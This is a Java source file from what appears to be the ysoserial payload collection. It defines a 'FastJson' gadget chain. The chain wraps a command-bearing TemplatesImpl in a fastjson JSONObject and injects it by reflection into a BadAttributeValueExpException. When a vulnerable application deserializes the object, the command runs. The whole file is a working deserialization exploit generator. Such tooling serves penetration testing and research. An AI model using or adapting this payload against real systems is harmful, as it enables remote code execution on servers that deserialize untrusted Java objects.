package ysoserial.payloads;

import com.alibaba.fastjson.JSONObject;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class FastJson extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONObject jo = new JSONObject();
        jo.put("oops",templatesImpl);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, jo);
        return val;
    }
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
